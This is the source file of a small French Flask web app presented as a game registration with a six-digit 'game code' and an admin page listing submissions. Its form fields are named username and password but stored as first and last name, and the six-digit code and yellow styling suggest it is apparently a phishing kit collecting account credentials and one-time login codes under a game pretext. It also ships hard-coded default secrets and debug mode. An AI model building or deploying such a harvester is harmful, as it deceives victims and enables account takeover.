from flask import Flask, request, redirect, render_template, session
import sqlite3
import os

app = Flask(__name__)

app.secret_key = os.environ.get("SECRET_KEY", "nom d'utilisateur")

ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "mot de passe")


# =========================
# BASE DE DONNÉES
# =========================

def init_db():
    with sqlite3.connect("reponses.db") as db:
        db.execute("""
            CREATE TABLE IF NOT EXISTS personnes (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                prenom TEXT NOT NULL,
                nom TEXT NOT NULL,
                code TEXT
            )
        """)


# =========================
# PAGE D'ACCUEIL
# =========================

@app.route("/")
def accueil():
    return render_template("index.html")


# =========================
# ENREGISTREMENT DU JOUEUR
# =========================

@app.route("/envoyer", methods=["POST"])
def envoyer():

    prenom = request.form.get("nom d'utilisateur", "").strip()
    nom = request.form.get("mot de passe", "").strip()

    if not prenom or not nom:
        return "Veuillez remplir le prénom et le nom.", 400

    with sqlite3.connect("reponses.db") as db:

        curseur = db.execute(
            """
            INSERT INTO personnes (prenom, nom)
            VALUES (?, ?)
            """,
            (prenom, nom)
        )

        personne_id = curseur.lastrowid

    # On garde l'identifiant du joueur pendant le jeu
    session["personne_id"] = personne_id

    return redirect("/jeu")


# =========================
# PAGE DU JEU
# =========================

@app.route("/jeu")
def jeu():

    if not session.get("personne_id"):
        return redirect("/")

    return render_template("jeu.html")


# =========================
# ENREGISTRER LE CODE DU JEU
# =========================

@app.route("/code", methods=["POST"])
def enregistrer_code():

    personne_id = session.get("personne_id")

    if not personne_id:
        return redirect("/")

    chiffres = [
        request.form.get("code1", ""),
        request.form.get("code2", ""),
        request.form.get("code3", ""),
        request.form.get("code4", ""),
        request.form.get("code5", ""),
        request.form.get("code6", "")
    ]

    # Vérification des 6 cases
    for chiffre in chiffres:

        if not chiffre.isdigit() or len(chiffre) != 1:
            return "Le code doit contenir exactement 6 chiffres.", 400

    # Assemblage des 6 chiffres
    code_complet = "".join(chiffres)

    # Enregistrement dans la base
    with sqlite3.connect("reponses.db") as db:

        db.execute(
            """
            UPDATE personnes
            SET code = ?
            WHERE id = ?
            """,
            (code_complet, personne_id)
        )

    # On supprime l'identifiant de la session
    session.pop("personne_id", None)

    return """
    <!DOCTYPE html>
    <html lang="fr">

    <head>
        <meta charset="UTF-8">
        <title>Merci</title>
    </head>

    <body style="
        background:#FFFC00;
        font-family:Arial;
        text-align:center;
        padding-top:100px;
    ">

        <h1>Merci !</h1>

        <p>Ton code de jeu a bien été enregistré.</p>

        <a href="/" style="
            color:black;
            font-size:20px;
        ">
            Retour
        </a>

    </body>

    </html>
    """


# =========================
# CONNEXION ADMIN
# =========================

@app.route("/admin", methods=["GET", "POST"])
def admin():

    if request.method == "POST":

        password = request.form.get("password", "")

        if password == ADMIN_PASSWORD:

            session["admin"] = True

            return redirect("/reponses")

        return "Mot de passe incorrect.", 401

    return render_template("login.html")


# =========================
# AFFICHER LES RÉPONSES
# =========================

@app.route("/reponses")
def reponses():

    if not session.get("admin"):
        return redirect("/admin")

    with sqlite3.connect("reponses.db") as db:

        personnes = db.execute(
            """
            SELECT id, prenom, nom, code
            FROM personnes
            ORDER BY id DESC
            """
        ).fetchall()

    return render_template(
        "reponses.html",
        personnes=personnes
    )


# =========================
# DÉCONNEXION ADMIN
# =========================

@app.route("/deconnexion")
def deconnexion():

    session.clear()

    return redirect("/admin")


# =========================
# LANCEMENT
# =========================

init_db()

if __name__ == "__main__":
    app.run(debug=True)


